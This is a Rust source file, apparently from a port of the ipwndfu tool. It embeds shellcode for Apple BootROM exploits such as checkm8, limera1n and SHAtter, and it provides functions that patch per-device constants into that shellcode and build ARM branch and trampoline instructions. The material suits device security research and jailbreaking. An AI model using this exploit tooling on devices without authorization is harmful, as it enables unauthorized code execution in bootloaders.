//! Shellcode blobs and the constant-substitution helper shared by every exploit.
//!
//! The Python original read `bin/*.bin` from disk at runtime. The blobs are build-time
//! inputs to this crate and never change at runtime, so they are embedded directly; this
//! removes the requirement to run from the repository root just to send a payload.

use crate::utilities::{u32_le, u64_le};

pub const CHECKM8_ARMV7: &[u8] = include_bytes!("../../bin/checkm8_armv7.bin");
pub const CHECKM8_ARM64: &[u8] = include_bytes!("../../bin/checkm8_arm64.bin");
pub const USB_0XA1_2_ARMV7: &[u8] = include_bytes!("../../bin/usb_0xA1_2_armv7.bin");
pub const USB_0XA1_2_ARM64: &[u8] = include_bytes!("../../bin/usb_0xA1_2_arm64.bin");
pub const T8010_T8011_DISABLE_WXN_ARM64: &[u8] =
    include_bytes!("../../bin/t8010_t8011_disable_wxn_arm64.bin");
pub const T8015_SHELLCODE_ARM64: &[u8] = include_bytes!("../../bin/t8015_shellcode_arm64.bin");
pub const LIMERA1N: &[u8] = include_bytes!("../../bin/limera1n-shellcode.bin");
pub const SHATTER: &[u8] = include_bytes!("../../bin/SHAtter-shellcode.bin");
pub const STEAKS4UCE: &[u8] = include_bytes!("../../bin/steaks4uce-shellcode.bin");
pub const PWN24KPWN: &[u8] = include_bytes!("../../bin/24Kpwn-shellcode.bin");
pub const ALLOC8: &[u8] = include_bytes!("../../bin/alloc8-shellcode.bin");
pub const IBSS_FLASH_NOR: &[u8] = include_bytes!("../../bin/ibss-flash-nor-shellcode.bin");

#[derive(Clone, Copy, PartialEq, Eq)]
pub enum Arch {
    Armv7,
    Arm64,
}

impl Arch {
    /// Width in bytes of the substituted constants (and of a command argument).
    pub fn word_size(self) -> usize {
        match self {
            Arch::Armv7 => 4,
            Arch::Arm64 => 8,
        }
    }
}

/// `checkm8.prepare_shellcode` (and the identical inline logic in `alloc8`,
/// `limera1n` and `steaks4uce`).
///
/// The shellcode ends with a run of `0xBAD0000N` placeholders that are overwritten with
/// per-device constants. The original asserts the placeholders are intact so a mismatched
/// shellcode binary is caught before anything is sent to the device.
pub fn prepare_shellcode(shellcode: &[u8], arch: Arch, constants: &[u64]) -> Vec<u8> {
    let size = arch.word_size();
    assert!(
        constants.len() * size <= shellcode.len(),
        "prepare_shellcode: more constants than the shellcode has room for"
    );
    let placeholders_offset = shellcode.len() - size * constants.len();

    for (i, _) in constants.iter().enumerate() {
        let offset = placeholders_offset + size * i;
        let value = if size == 4 {
            u32_le(shellcode, offset) as u64
        } else {
            u64_le(shellcode, offset)
        };
        assert_eq!(
            value,
            0xBAD0_0001 + i as u64,
            "prepare_shellcode: placeholder {} is 0x{:x}, expected 0x{:x}",
            i + 1,
            value,
            0xBAD0_0001 + i as u64
        );
    }

    let mut out = shellcode[..placeholders_offset].to_vec();
    for constant in constants {
        match size {
            4 => {
                assert!(
                    *constant <= u32::MAX as u64,
                    "prepare_shellcode: constant 0x{:x} does not fit in 32 bits",
                    constant
                );
                out.extend_from_slice(&(*constant as u32).to_le_bytes());
            }
            _ => out.extend_from_slice(&constant.to_le_bytes()),
        }
    }
    out
}

/// `checkm8.asm_arm64_branch`: a single unconditional `B` instruction.
pub fn asm_arm64_branch(src: u64, dest: u64) -> [u8; 4] {
    let value: u32 = if src > dest {
        0x1800_0000 - ((src - dest) / 4) as u32
    } else {
        0x1400_0000 + ((dest - src) / 4) as u32
    };
    value.to_le_bytes()
}

/// `checkm8.asm_arm64_x7_trampoline`:
/// `LDR X7, [PC, #8]; BR X7; <64-bit literal>`
pub fn asm_arm64_x7_trampoline(dest: u64) -> Vec<u8> {
    let mut out = vec![0x47, 0x00, 0x00, 0x58, 0xE0, 0x00, 0x1F, 0xD6];
    out.extend_from_slice(&dest.to_le_bytes());
    out
}

/// `checkm8.asm_thumb_trampoline`: `LDR.W PC, [PC]` (or `[PC, #2]`).
pub fn asm_thumb_trampoline(src: u64, dest: u64) -> Vec<u8> {
    assert!(src % 2 == 1 && dest % 2 == 1, "thumb addresses must be odd");
    let instruction: u32 = if src % 4 == 1 { 0xF000F8DF } else { 0xF002F8DF };
    let mut out = instruction.to_le_bytes().to_vec();
    out.extend_from_slice(&(dest as u32).to_le_bytes());
    out
}
